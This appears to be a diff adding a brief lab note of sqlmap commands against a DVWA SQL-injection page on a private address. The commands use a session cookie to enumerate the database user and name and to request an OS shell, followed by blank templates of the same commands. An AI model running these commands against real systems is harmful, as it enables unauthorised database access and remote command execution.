@@ -1,0 +1,11 @@
+sqlmap -u "http://172.16.1.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=efc1b1545fd26e619025f0474f9f9a48"
+
+sqlmap -u "http://172.16.1.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=efc1b1545fd26e619025f0474f9f9a48" --current-user --current-db
+
+sqlmap -u "http://172.16.1.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=efc1b1545fd26e619025f0474f9f9a48" --os-shell
+
+sqlmap -u " " --cookie=" "
+
+sqlmap -u " " --cookie=" " --current-user --current-db
+
+sqlmap -u " " --cookie=" " --os-shell
